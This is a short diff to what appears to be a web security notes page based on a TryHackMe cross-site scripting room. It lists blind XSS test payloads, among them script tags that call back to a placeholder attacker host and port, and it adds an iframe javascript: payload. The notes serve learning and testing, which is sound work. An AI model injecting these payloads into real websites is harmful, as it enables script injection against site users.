@@ -138,7 +138,8 @@ Taken from: [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss)
 
 1. `'"> <script>fetch('http://<IP>:[port]?xss=yay')</script>`
 2. `'"> <script src="http://<IP>:[port]?xss=yay"></script>`&#x20;
-3. `<img/>`,`<object/>`,`<iframe/>`
+3. `<img/>`,`<object/>`
+4. ``<iframe src="javascript:alert(`xss`)"/>``
 
 {% embed url="https://github.com/lauritzh/blind-xss-payloads/blob/main/README.md" %}
 
